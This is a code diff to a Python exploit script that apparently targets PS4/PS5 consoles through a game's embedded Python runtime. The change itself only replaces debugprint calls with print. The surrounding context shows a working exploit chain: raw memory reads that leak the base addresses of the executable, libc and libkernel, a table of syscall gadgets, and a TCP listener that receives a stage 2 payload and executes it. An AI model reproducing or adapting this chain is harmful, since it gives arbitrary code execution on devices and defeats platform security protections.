@@ -149,11 +149,6 @@ class SocketError(Exception):
 nogc = []  # things we want to keep a reference to, to prevent gc
 
 
-def debugprint(*args):
-    if DEBUG:
-        print(" ".join([str(arg) for arg in list(args)]))
-
-
 # Thanks @chilaxan
 def sizeof(obj):
     return type(obj).__sizeof__(obj)
@@ -587,19 +582,19 @@ class SploitCore(object):
     def __init__(self):
         self.mem = getmem()
 
-        debugprint("[*] Obtained memory object")
+        print("[*] Obtained memory object")
 
         func_type_addr = addrof(FunctionType)
-        debugprint("[*] FunctionType address: 0x%x" % func_type_addr)
+        print("[*] FunctionType address: 0x%x" % func_type_addr)
         func_repr_addr = u64(
             self.mem[
                 func_type_addr - 0x1000 + 11 * 8 : func_type_addr - 0x1000 + 11 * 8 + 8
             ]
         )
-        debugprint("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
+        print("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
 
         self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
-        debugprint("[*] Executable base address: 0x%x" % self.exec_addr)
+        print("[*] Executable base address: 0x%x" % self.exec_addr)
         self.modules = {}
 
         # Use hardcoded gadgets
@@ -655,12 +650,12 @@ class SploitCore(object):
             readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
             - SELECTED_LIBC["strcmp"]
         )
-        debugprint("[*] libc base address: 0x%x" % self.libc_addr)
+        print("[*] libc base address: 0x%x" % self.libc_addr)
 
         gettimeofday_in_libkernel = readuint(
             self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
         )
-        debugprint("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)
+        print("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)
 
         mod_info = bytes([b"\0"] * 0x300)
         nogc.append(mod_info)
@@ -668,7 +663,7 @@ class SploitCore(object):
         sceKernelGetModuleInfoFromAddr_addr = readuint(
             self.libc_addr + SELECTED_LIBC["sceKernelGetModuleInfoFromAddr"], 8
         )
-        debugprint(
+        print(
             "[*] sceKernelGetModuleInfoFromAddr address: 0x%x"
             % sceKernelGetModuleInfoFromAddr_addr
         )
@@ -685,8 +680,7 @@ class SploitCore(object):
         self.libkernel_addr = struct.unpack(
             "<Q", mod_info[SEGMENTS_OFFSET : SEGMENTS_OFFSET + 8]
         )[0]
-        debugprint("[*] libkernel base address: 0x%x" % self.libkernel_addr)
-
+        print("[*] libkernel base address: 0x%x" % self.libkernel_addr)
         init_proc_addr = struct.unpack(
             "<Q", mod_info[INIT_PROC_ADDR_OFFSET : INIT_PROC_ADDR_OFFSET + 8]
         )[0]
@@ -723,13 +717,13 @@ class SploitCore(object):
                     self.syscall_table[syscall_number] = syscall_gadget_addr
             if not self.syscall_table:
                 raise Exception("syscall gadget pattern not found")
-            debugprint("[*] syscall gadget table built")
+            print("[*] syscall gadget table built")
         elif delta == 0x10:
             self.platform = "ps5"
             self.syscall_addr = (
                 gettimeofday_in_libkernel + 0x7
             )  # to skip `mov rax, <num>`
-            debugprint("[*] syscall gadget address: 0x%x" % self.syscall_addr)
+            print("[*] syscall gadget address: 0x%x" % self.syscall_addr)
         else:
             raise Exception("Unknown platform (delta: 0x%x)" % delta)
 
@@ -892,7 +886,7 @@ class SploitCore(object):
             syscall=True,
         )
         if fd < 0:
-            debugprint("[-] Failed to open notification device")
+            print("[-] Failed to open notification device")
             return
 
         self.run_function(
@@ -920,7 +914,7 @@ class SploitCore(object):
                 "netgetiflist failed to get count, errno: %d\n%s"
                 % (self.errno, self.get_error_string())
             )
-        debugprint("[*] Found %d network interfaces" % count)
+        print("[*] Found %d network interfaces" % count)
 
         buf_size = count * 0x1E0
         ifbuf = b"\0" * buf_size
@@ -1024,7 +1018,7 @@ def create_tcp_socket(sc):
     s = u64_to_i64(
         sc.run_function(SYSCALL["socket"], AF_INET, SOCK_STREAM, syscall=True)
     )
-    debugprint("[*] Created TCP socket: %d" % s)
+    print("[*] Created TCP socket: %d" % s)
     if s < 0:
         raise SocketError(
             "socket failed with return value %d, error %d\n%s"
@@ -1040,12 +1034,12 @@ def create_tcp_socket(sc):
         4,
         syscall=True,
     )
-    debugprint("[*] Set socket options: %d" % s)
+    print("[*] Set socket options: %d" % s)
 
     bind = u32_to_i32(
         sc.run_function(SYSCALL["bind"], s, refbytearray(sockaddr_in), 16, syscall=True)
     )
-    debugprint("[*] Bound socket: %d" % bind)
+    print("[*] Bound socket: %d" % bind)
     if bind != 0:
         raise SocketError(
             "bind failed with return value %d, error %d\n%s"
@@ -1058,24 +1052,24 @@ def create_tcp_socket(sc):
             "listen failed with return value %d, error %d\n%s"
             % (listen, sc.errno, sc.get_error_string())
         )
-    debugprint("[*] Listening on socket: %d" % s)
+    print("[*] Listening on socket: %d" % s)
 
     return s
 
 
 def poc():
-    debugprint(
+    print(
         "[*] Detected console kind: %s, game name: %s" % (CONSOLE_KIND, config.name)
     )
     if not SELECTED_GADGETS or not SELECTED_LIBC or not SELECTED_EXEC:
         raise Exception("Unsupported game / console kind combination")
-    debugprint("[*] Will exploit the game")
+    print("[*] Will exploit the game")
     sc = SploitCore()
 
     s = None
     port = None
     len_buf = bytearray(b"\0" * 8)
-    debugprint("[*] Creating TCP socket...")
+    print("[*] Creating TCP socket...")
     s = create_tcp_socket(sc)
 
     sc.run_function(
@@ -1109,7 +1103,7 @@ def poc():
                 % (client_sock, sc.errno, sc.get_error_string())
             )
 
-        debugprint("Client connected on socket %d" % client_sock)
+        print("Client connected on socket %d" % client_sock)
 
         read_size = u64_to_i64(
             sc.run_function(
@@ -1126,7 +1120,7 @@ def poc():
                 % (read_size, sc.errno, sc.get_error_string())
             )
 
-        debugprint("Received stage 2 payload, executing...")
+        print("Received stage 2 payload, executing...")
 
         sc.run_function(
             SYSCALL["close"], client_sock, syscall=True
